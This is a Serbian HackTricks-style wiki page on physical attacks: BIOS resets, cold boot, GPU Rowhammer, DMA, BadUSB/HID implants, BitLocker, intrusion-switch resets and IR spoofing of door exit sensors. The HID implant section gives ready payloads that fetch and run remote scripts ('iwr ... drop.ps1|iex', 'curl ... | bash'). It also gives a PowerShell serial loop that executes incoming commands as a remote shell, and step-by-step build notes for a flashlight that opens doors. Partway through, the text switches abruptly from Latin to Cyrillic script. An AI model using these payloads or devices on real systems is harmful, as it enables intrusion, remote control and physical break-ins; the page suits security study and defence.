# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

Za otkrivanje interfejsa na nivou ploče, serijske konzole, pristup flash memoriji, napade bočnim kanalima i glitching, pogledajte [Hardware Hacking](hardware-hacking/README.md) i poglavlja posvećena pojedinačnim interfejsima. Ova stranica obrađuje napade koji zahtevaju fizički pristup celom sistemu.

## Oporavak BIOS lozinke i bezbednost sistema

Podešavanja firmvera starijih PC računara mogu se resetovati isključivanjem CMOS baterije ili korišćenjem dokumentovanog džampera za brisanje CMOS-a. Potrebno vreme bez napajanja zavisi od ploče, a lozinke ili ključevi modernog UEFI-ja mogu biti smešteni u nevolatilnoj flash memoriji, ugrađenom kontroleru ili bezbednosnom uređaju, pa će preživeti uklanjanje baterije. Pre spajanja pinova pogledajte priručnik za ploču/servis; ovaj postupak može i da poništi TPM merenja i pokrene oporavak šifrovanog diska.

Na starijim x86 sistemima, alati kao što su **killCMOS** i **CmosPwd** mogu da pregledaju ili izmene podešavanja sačuvana u CMOS-u iz pokretačkog okruženja. CmosPwd prepoznaje formate lozinki iz dokumentovanog skupa starijih BIOS porodica i može da napravi rezervnu kopiju, vrati ili obriše/uništi stanje CMOS-a; objavljene verzije namenjene su starijim DOS/Windows, Linux, FreeBSD i NetBSD okruženjima.<sup>[[18]](#references)</sup> Ovi alati nisu univerzalni alati za uklanjanje UEFI lozinki i zahtevaju dovoljan pristup hardveru/firmveru.

Neki firmveri laptopova prikazuju kod izazova specifičan za proizvođača nakon nekoliko neuspelih pokušaja unosa lozinke. Baze podataka kao što je [bios-pw.org](https://bios-pw.org) mogu da izračunaju starije lozinke za oporavak za određene modele proizvođača, ali mnogi sistemi primenjuju zaključavanje bez koda izazova iz kog se lozinka može izračunati. Svaku generisanu lozinku smatrajte specifičnom za model i izbegavajte iscrpljivanje trajnih brojača pokušaja.

### UEFI bezbednost

Za moderne **UEFI** sisteme, CHIPSEC može da proveri zaštitu promenljivih Secure Boot-a. Najpre pokrenite proveru koja ne vrši izmene; opcioni režim `-a modify` namerno pokušava da ošteti promenljive i treba ga koristiti samo na sistemu u laboratorijskom okruženju koji se može oporaviti. CHIPSEC upozorava da njegov privilegovani upravljački program i pristup hardveru niskog nivoa nisu pogodni za krajnje uređaje u produkciji.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM-a i Cold Boot Attacks

DRAM ne gubi sve bitove odmah nakon prestanka osvežavanja. Brzina gubitka podataka znatno se razlikuje u zavisnosti od tehnologije modula i temperature; hlađenje može da sačuva korisne podatke mnogo duže nego ciklus isključivanja i uključivanja bez hlađenja. Cold-boot attack brzo ponovo pokreće sistem u malom okruženju za akviziciju ili prenosi ohlađeni modul, snima sirovu memoriju i rekonstruiše kriptografske ključeve uprkos gubitku bitova. Alat za kopiranje diska nije automatski alat za snimanje fizičke memorije, a Volatility analizira snimak, ali ga ne prikuplja; koristite alat za akviziciju koji odgovara platformi i koji je validiran.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer protiv tabela stranica

Savremeni GPU Rowhammer napadi postaju mnogo korisniji kada ciljaju **metapodatke GPU virtuelne memorije** umesto običnih bafera. Nedavna istraživanja na **GDDR6 NVIDIA Ampere GPU-ovima** pokazuju da napadač koji izvršava neprivilegovani CUDA kod može da napravi GPU-specifične obrasce hammering-a, upotrebi **memory massaging** da postavi strukture za straničenje u ranjive redove i zatim preokrene bitove u **tabeli stranica poslednjeg nivoa** ili srednjem **direktorijumu stranica**. Kada se ošteti jedan unos za prevođenje, napadač može da uspostavi **proizvoljno čitanje/pisanje GPU memorije**, a zatim da pređe na kompromitovanje hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Obrazac eksploatacije

1. **Profilisati redove podložne hammering-u** u GDDR6 i napraviti obrasce hammering-a koji uzimaju u obzir osvežavanje i nisu uniformni, kako bi se zaobišle mitigacije u DRAM-u.
2. **Urediti GPU alokacije** tako da upravljački program smesti strukture za prevođenje adresa stranica na fizičke lokacije podložne hammering-u, umesto da ih zadrži u podrazumevanom zaštićenom skupu. U praksi to može da podrazumeva iscrpljivanje regiona sa tabelama stranica u memoriji nižeg opsega i raspršivanje velikih, retkih UVM mapiranja sa kontrolisanim koracima.
3. **Preokrenuti bitove metapodataka za prevođenje**, kao što su **PFN** ili bitovi povezani sa aperture-om, unutar unosa tabele stranica/direktorijuma stranica, tako da se virtuelna stranica koju kontroliše napadač preslikava na stranice tabela stranica, proizvoljnu GPU memoriju ili sistemska mapiranja vidljiva hostu.
4. Ponovo upotrebiti falsifikovano mapiranje da bi se prepisali dodatni unosi za prevođenje i ostvarilo **proizvoljno čitanje/pisanje GPU memorije** u različitim GPU kontekstima.

### Prelaz na host i mere ublažavanja

- Kada je **IOMMU onemogućen**, falsifikovana mapiranja sistemskog aperture-a mogu GPU-u da izlože proizvoljnu **fizičku memoriju hosta**, pretvarajući GPU primitivu u potpuno kompromitovanje hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cilja unose tabela stranica poslednjeg nivoa, dok **GeForge** pokazuje da oštećivanje nivoa direktorijuma stranica može biti lakše jer jedan preokrenuti bit može da preusmeri veće podstablo prevođenja. Nemojte smatrati samo jedan nivo straničenja bezbednosno kritičnim.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** je i dalje važan jer blokira direktan put do proizvoljne memorije hosta koji koriste GDDRHammer/GeForge, ali **ne predstavlja potpunu meru ublažavanja**. **GPUBreach** pokazuje drugi korak napada: napadač oštećuje baferе CPU-a koje može da upisuje GPU i koji su u vlasništvu upravljačkog programa, a zatim aktivira greške u bezbednosti memorije NVIDIA upravljačkog programa da bi dobio primitivu za upis u kernel i **root shell**, čak i kada je IOMMU omogućen.<sup>[[3]](#references)</sup>
- **ECC na nivou sistema** je praktična mera za ojačavanje bezbednosti na podržanim GPU-ovima za radne stanice/servere. Potrošački GPU-ovi bez ECC-a imaju slabiju površinu odbrane.<sup>[[4]](#references)</sup>
- Ovi napadi nisu samo teorijski: **GeForge** je prijavio **1.171** preokrenutih bitova na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izradu funkcionalnog lanca za eskalaciju privilegija na hostu.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Napadi direktnim pristupom memoriji (DMA)

Za offline UEFI IFR/NVRAM zakrpljivanje koje može da oslabi sprovođenje IOMMU pravila pre pokretanja sistema i omogući Windows DMA lanac napada, pogledajte:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstrira **akviziciju i zakrpljivanje memorije zasnovano na DMA-u** preko interfejsa kao što su FireWire i rane konfiguracije Thunderbolt-a, uključujući istorijske obrasce zaobilaženja prijave. Nije jednostavno „neefikasan protiv Windows 10“: mogućnost eksploatacije zavisi od interfejsa, verzije sistema, IOMMU pravila, stanja zaključavanja i od toga da li je Windows Kernel DMA Protection podržan i omogućen. Windows 10 verzija 1803 i novije uvele su Kernel DMA Protection na kompatibilnim platformama, čime se površina napada znatno promenila.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB za pristup sistemu

Na nešifrovanom ili već otključanom Windows volumenu, offline okruženje može da zameni binarne datoteke za pristupačnost, kao što su **sethc.exe** ili **Utilman.exe**, datotekom **cmd.exe**, čime se dobija komandni redak SYSTEM kada se aktivira odgovarajuća prečica na ekranu za prijavu. Alati kao što je **chntpw** mogu da uređuju podatke lokalnih SAM naloga. Ove metode ne zaobilaze zaključan BitLocker volumen i mogu da oštete akreditive zaštićene pomoću DPAPI/EFS; sačuvajte forenzičke kopije i rezervne kopije.

**Kon-Boot** je komercijalni alat za zaobilaženje autentifikacije pri pokretanju sistema, namenjen podržanim konfiguracijama Windows/macOS sistema. Kompatibilnost zavisi od OS-a, režima firmvera, Secure Boot-a i podešavanja šifrovanja diska; alat ne dešifruje BitLocker zaključan volumen.<sup>[[10]](#references)</sup>

---

## Rad sa Windows bezbednosnim funkcijama

### Prečice za pokretanje sistema i oporavak

- **Delete/Supr**, F2, F10 ili neki drugi taster proizvođača može da otvori podešavanja firmvera.
- **F8** otvara nasleđene napredne opcije pokretanja Windows-a samo na konfiguracijama na kojima je taj put i dalje omogućen; trenutni način ulaska u oporavak se razlikuje.
- Držanje tastera **Shift** može da spreči automatsku prijavu u Windows na nekim konfiguracijama, mada podešavanja pravila/registratora mogu da onemoguće takvo ponašanje.<sup>[[17]](#references)</sup>

### BAD USB uređaji

Uređaji kao što su **USB Rubber Ducky** i Teensy ploče mogu da se predstave kao pouzdane HID tastature i unesu unapred definisane pritiske tastera. Korisni teret u početku ima privilegije i pristup radnoj površini prijavljene sesije; UAC upiti, zaključavanje ekrana, raspored tastature, vremenska usklađenost i pravila USB uređaja na krajnjoj tački i dalje ga ograničavaju.<sup>[[15]](#references)</sup>

Programabilne periferije mogu i da napadaju host parsere kernela i koordiniraju više USB uređaja radi heap grooming-a i otkrivanja informacija:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

Za slučaj Windows UAS parsera masovne memorije, pogledajte:

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### Volume Shadow Copy

Administratorske ili rezervne privilegije mogu da se koriste za pravljenje shadow copy kopije ili čuvanje košnica registratora, kako bi se preuzeli zaključani fajlovi kao što su **SAM** i **SYSTEM**. Ovo je tehnika prikupljanja podataka nakon kompromitovanja, a ne zaobilaženje privilegija, i treba je povezati sa događajima `diskshadow`/VSS i izvoza košnica registratora.

## BadUSB / HID tehnike implantacije

### Android HID uređaj aktiviran NFC-om

Rootovan Android telefon može da postane programabilna USB tastatura samo ako njegov USB kontroler i kernel podržavaju **USB gadget/HID**. Na kompatibilnim uređajima, Kali NetHunter prikazuje profile gadget-a kroz **USB Arsenal**. Druga mogućnost je [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), koji kreira ConfigFS gadget funkcije i može da izloži znakovne uređaje za tastaturu/miš, kao što su `/dev/hidg0` i `/dev/hidg1`. Alat samo kreira gadget krajnju tačku; poseban proces mora da joj upisuje HID izveštaje. Root pristup ne može da nadoknadi kernelu nedostatak ConfigFS-a, HID gadget podrške ili upotrebljivog USB Device Controller-a.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ova krajnja tačka može da se kombinuje sa Android NFC-om kao fizičkim okidačem. Aplikacija [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) čita UID taga, pretvara ga u očekivani format, proverava lokalnu listu dozvoljenih vrednosti i, ako pronađe podudaranje, šalje konfigurisani niz pritisaka tastera u stilu Rubber Ducky-ja. Povezani host vidi običan unos sa tastature i nije mu potreban NFC softver.<sup>[[22]](#references)[[24]](#references)</sup>

Proverite enumeraciju i raspored tastature u praznom tekstualnom editoru pre upotrebe prečica ili komandi. Bezopasan korisni teret je:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Važne granice poverenja:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist je identifikacija, a ne autentifikacija**. UID-ovi su javni, a neki tipovi tokena ili emulatori omogućavaju kloniranje ili imitiranje. Kopirani dozvoljeni UID prati isti put obrade kao originalni token.
- Magisk modul **NfcScreenOff** zakrpljuje NFC servis tako da se ponaša kao da je ekran uključen i otključan. Ako je telefon već povezan sa hostom, neko može da pokrene payload bez otključavanja telefona.
- Lozinke, API tokeni i komande sačuvani u payload-u mogu se povratiti sa root-ovanog uređaja ili uređaja sa otključanim bootloaderom. Unos lozinke preko HID-a predstavlja automatizovani unos lozinke koja se može ponovo koristiti, a ne autentifikaciju bez lozinke.
- HID injekcija koristi privilegije aktivne radne površine i zavisi od fokusa, tajminga i rasporeda tastature hosta. Za osetljive radnje zahtevajte nedavnu potvrdu korisnika pre slanja, izbegavajte privilegovane tajne u skriptama i koristite autentifikator sa kriptografskim challenge-response mehanizmom za pravu autentifikaciju.

### Wi-Fi implantati u kablovima

- Implantati zasnovani na ESP32-S3, kao što je **Evil Crow Cable Wind**, skrivaju se unutar USB-A→USB-C ili USB-C↔USB-C kablova, pojavljuju se isključivo kao USB tastatura i preko Wi-Fi-ja izlažu svoj C2 stek. Operater treba samo da napaja kabl preko hosta žrtve, napravi hotspot pod nazivom `Evil Crow Cable Wind` sa lozinkom `123456789` i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) da bi pristupio ugrađenom HTTP interfejsu.<sup>[[8]](#references)</sup>
- Veb interfejs sadrži kartice *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani payload-i označeni su prema OS-u, rasporedi tastature menjaju se u hodu, a VID/PID stringovi mogu da se izmene kako bi oponašali poznate periferne uređaje.
- Pošto se C2 nalazi unutar kabla, telefonom je moguće pripremiti payload-e, pokrenuti njihovo izvršavanje i upravljati Wi-Fi akreditivima bez korišćenja mreže organizacije — korisno za kratke fizičke upade.

### AutoExec payload-i prilagođeni OS-u

- AutoExec pravila povezuju jedan ili više payload-a koji se izvršavaju odmah nakon USB enumeracije. Implantat vrši osnovno prepoznavanje OS-a i bira odgovarajuću skriptu.
- Primer toka rada:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, dovoljna je zamena kabla za punjenje da bi se ostvario početni pristup metodom „plug-and-pwn“ u kontekstu prijavljenog korisnika.

### HID-om pokrenuta udaljena ljuska preko Wi-Fi TCP-a

1. **Pokretanje nizom pritisaka tastera:** Sačuvani payload otvara konzolu i ubacuje petlju koja izvršava sve što stigne na novom USB serijskom uređaju. Minimalna varijanta za Windows je:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant održava USB CDC kanal otvorenim dok njegov ESP32-S3 pokreće TCP klijent (Python skriptu, Android APK ili izvršnu datoteku za desktop) koji se povezuje nazad sa operatorom. Svi bajtovi uneti u TCP sesiju prosleđuju se u gornju serijsku petlju, čime se omogućava daljinsko izvršavanje komandi čak i na hostovima bez mrežne veze. Izlaz je ograničen, pa operatori obično pokreću komande naslepo (kreiranje naloga, pripremu dodatnih alata itd.).

### HTTP OTA površina za ažuriranje

- Dokumentovani interfejs Evil Crow Cable Wind izlaže neautentifikovanu krajnju tačku za ažuriranje firmvera na `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operators can hot-swap features (npr. flešovati firmware za USB Army Knife) usred angažovanja bez otvaranja kabla, što omogućava implantatu da pređe na nove mogućnosti dok je i dalje priključen na ciljni host.

## Zaobilaženje BitLocker enkripcije

Ovlašćeno forenzičko pribavljanje podataka sa sistema koji je uključen ili je nedavno radio može sadržati ključ glavnog volumena BitLocker-a ili povezani ključni materijal dok je volumen otključan. Komercijalni alati kao što su Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic mogu da pretražuju podržane memorijske slike, datoteke hibernacije ili crash dump-ove, ali uspeh nije zagarantovan. Savremeni Windows takođe šifruje crash dump-ove kada je BitLocker omogućen, a sačuvana 48-cifrena lozinka za oporavak razlikuje se od ključa volumena koji se nalazi u memoriji.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Socijalni inženjering za dodavanje ključa za oporavak

Napadač koji ubedi administratora da pokrene komande za upravljanje BitLocker-om može da doda zaštitnik u obliku lozinke za oporavak, spoljnog ključa ili nekog drugog tipa, a zatim da ga presretne. Lozinka za oporavak ne može biti proizvoljan niz nula: numeričke lozinke za oporavak BitLocker-a moraju da budu validiranog 48-cifrenog formata. Odgovarajuća sintaksa za ovlašćenu administraciju je `manage-bde -protectors -add C: -recoverypassword`; izlistajte dodate zaštitnike pomoću komande `manage-bde -protectors -get C:`. Nadgledajte dodavanje zaštitnika i postarajte se da se novi materijal za oporavak deponuje isključivo na odobrene lokacije.<sup>[[16]](#references)</sup>

---

## Iskorišćavanje prekidača za otvaranje kućišta / održavanje radi vraćanja BIOS-a na fabrička podešavanja

Mnogi savremeni laptopovi i desktop računari malog formata imaju **prekidač za otvaranje kućišta** koji nadgleda Embedded Controller (EC) i firmware BIOS/UEFI. Iako je osnovna namena prekidača da aktivira upozorenje kada se uređaj otvori, proizvođači ponekad implementiraju **nedokumentovanu prečicu za oporavak** koja se aktivira kada se prekidač prebaci po određenom obrascu.<sup>[[5]](#references)[[6]](#references)</sup>

### Kako napad funkcioniše

1. Prekidač je povezan sa **GPIO prekidom** na EC-u.
2. Firmware koji radi na EC-u prati **vreme i broj pritisaka**.
3. Kada prepozna unapred definisani obrazac, EC pokreće rutinu *mainboard-reset* koja **briše sadržaj sistemskog NVRAM/CMOS-a**.
4. Prilikom sledećeg pokretanja, pogođeni modeli učitavaju vraćeno stanje firmware-a. U zavisnosti od proizvođača i revizije, obrisano stanje može obuhvatati lozinku nadzornika, prilagođena podešavanja pokretanja ili upisane ključeve za Secure Boot; stanje TPM-a i posledice po šifrovanje diska moraju se proceniti zasebno.

> Vraćanje firmware-a na početna podešavanja može da ponovo omogući pokretanje sa spoljnog uređaja, ali **ne** dešifruje skladište. BitLocker ili drugi sistem za šifrovanje celog diska može da zatraži oporavak nakon promene TPM-a/firmware-a i da i dalje štiti interni disk bez ključa za oporavak.<sup>[[16]](#references)</sup>

### Primer iz prakse – Framework 13 laptop

Prečica za oporavak na Framework 13 (11./12./13. generacija) je:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Nakon desetog ciklusa, EC postavlja zastavicu koja nalaže BIOS-u da obriše NVRAM pri sledećem ponovnom pokretanju. Ceo postupak traje oko 40 s i potreban je **samo šrafciger**.<sup>[[5]](#references)</sup>

### Generički postupak eksploatacije

1. Uključite ili suspendujte pa probudite ciljni uređaj da bi EC radio.
2. Uklonite donji poklopac da biste pristupili prekidaču za detekciju otvaranja/održavanje.
3. Ponovite obrazac prebacivanja specifičan za proizvođača (pogledajte dokumentaciju i forume ili izvršite reverse engineering firmvera EC-a).
4. Ponovo sastavite uređaj i pokrenite ga, pa proverite koje su se postavke firmvera i akreditivi zaista promenili.
5. Ako imate ovlašćenje i dostupno je pokretanje sa spoljnog medija, pokrenite kontrolisanu live sliku. Kada se interni volumen legitimno otključa (ili ako nikada nije bio šifrovan), live okruženje može da pribavi akreditive i podatke ili da pregleda EFI System Partition. Izmena te particije radi instaliranja EFI implanta je trajna i veoma invazivna, a i dalje je ograničavaju Secure Boot, measured boot, zaštita od upisa u firmver i nadzor krajnjih uređaja. Šifrovanoj memoriji nije moguće pristupiti bez ključa ili materijala za oporavak.

### Detekcija i ublažavanje

* Beležite događaje otvaranja kućišta u OS konzoli za upravljanje i upoređujte ih sa neočekivanim resetovanjima BIOS-a.
* Koristite **plombe koje otkrivaju neovlašćeno otvaranje** na zavrtnjima/poklopcima.
* Držite uređaje u **fizički kontrolisanim prostorima**; pretpostavite da fizički pristup znači potpunu kompromitaciju.
* Ako je dostupno, isključite funkciju „maintenance switch reset“ proizvođača ili zahtevajte dodatno kriptografsko odobrenje za resetovanje NVRAM-a.

---

## Skriveno IR ubrizgavanje signala protiv beskontaktnih senzora za izlaz

### Karakteristike senzora
- Jeftini senzori „wave-to-exit“ kombinuju blisku IR LED diodu sa prijemnim modulom nalik onima u daljinskim upravljačima za TV. Modul šalje logičku jedinicu tek nakon što detektuje više impulsa (~4–10) odgovarajućeg nosećeg signala (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastični štitnik sprečava emiter i prijemnik da budu usmereni direktno jedan ka drugom, pa kontroler pretpostavlja da je svaki validirani noseći signal došao od obližnjeg odraza i aktivira relej koji otključava električni prihvatnik vrata.
- Kada kontroler utvrdi prisustvo mete, često menja modulacioni omotač signala za detekciju, ali prijemnik i dalje prihvata svaki niz impulsa koji odgovara filtriranom nosećem signalu.

### Tok napada
1. **Snimite profil emisije** – povežite logički analizator na pinove kontrolera da biste zabeležili talasne oblike pre detekcije i nakon nje koji pokreću internu IR LED diodu.
2. **Ponovite samo talasni oblik „nakon detekcije“** – uklonite/zanemarite fabrički emiter i pokrenite spoljnu IR LED diodu unapred aktiviranim obrascem. Pošto prijemnik proverava samo broj impulsa/frekvenciju, lažni noseći signal smatra pravim odrazom i aktivira relejnu liniju.
3. **Ograničite prenos** – šaljite noseći signal u podešenim nizovima impulsa (npr. desetinama milisekundi uključen, pa približno isto toliko isključen) da biste poslali minimalan broj impulsa bez zasićenja AGC-a prijemnika ili aktiviranja logike za obradu smetnji. Neprekidno emitovanje brzo smanjuje osetljivost senzora i sprečava aktiviranje releja.

### Reflektivno ubrizgavanje sa velike udaljenosti
- Zamena probne LED diode IR diodom velike snage, MOSFET drajverom i fokusnom optikom omogućava pouzdano aktiviranje sa udaljenosti od oko 6 m.
- Napadaču nije potrebna direktna vidljivost otvora prijemnika; usmeravanje snopa ka unutrašnjim zidovima, policama ili dovratnicima koji se vide kroz staklo omogućava reflektovanoj energiji da uđe u vidno polje od ~30° i oponaša mahanje rukom iz blizine.
- Pošto prijemnici očekuju samo slabe odraze, mnogo jači spoljni snop može da se odbije od više površina, а да и даље остане изнад прага детекције.

### Оружје за напад у облику батеријске лампе
- Уградња драјвера у комерцијалну батеријску лампу прикрива алат наочиглед. Замените видљиву LED диоду IR LED диодом велике снаге која одговара опсегу пријемника, додајте ATtiny412 (или сличан микроконтролер) за генерисање низова импулса од ≈30 kHz и користите MOSFET за одвођење струје LED диоде.
- Телескопско зум сочиво сужава сноп ради већег домета/прецизности, док вибрациони мотор којим управља MCU даје хаптичку потврду да је модулација активна, без емитовања видљиве светлости.
- Наизменично коришћење неколико сачуваних образаца модулације (мало различитих фреквенција носећег сигнала и омотача) повећава компатибилност са различитим породицама преименованих сензора, омогућавајући оператеру да усмерава сигнал ка рефлектујућим површинама док релеј звучно не кликне и врата се не отворе.

---

## References

- [1] [GDDRHammer: Значајно ометање DRAM редова — Rowhammer напади између компоненти помоћу савремених GPU-ова](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Форсирање GDDR меморије ради креирања GPU табела страница из забаве и користи](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Напади ескалације привилегија на GPU-овима помоћу Rowhammer-а](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Безбедносно обавештење: Rowhammer - јул 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Притисните овде да бисте преузели контролу“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Водич за ресетовање матичне плоче](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Нееее, не додирујте! – Заобилажење IR бесконтактних сензора за излаз помоћу скривене IR лампе“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Повежи, покрени, преузми контролу: хаковање помоћу Evil Crow Cable Wind-а“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer напад на NVIDIA чипове](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Званична документација и информације о компатибилности за Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC документација - Заштита Secure Boot променљивих](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Да не заборавимо: Cold Boot напади на кључеве за шифровање](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - манипулација физичком меморијом преко DMA-а](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Документација за Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Водич за BitLocker операције](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - понашање тастера Shift и аутоматског пријављивања](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Документација и преузимања за CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux документација - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Документација Linux кернела - USB HID gadget драјвер](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Претворите рутовани Android телефон у NFC аутентификатор и алат за аутоматизацију на рачунару](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
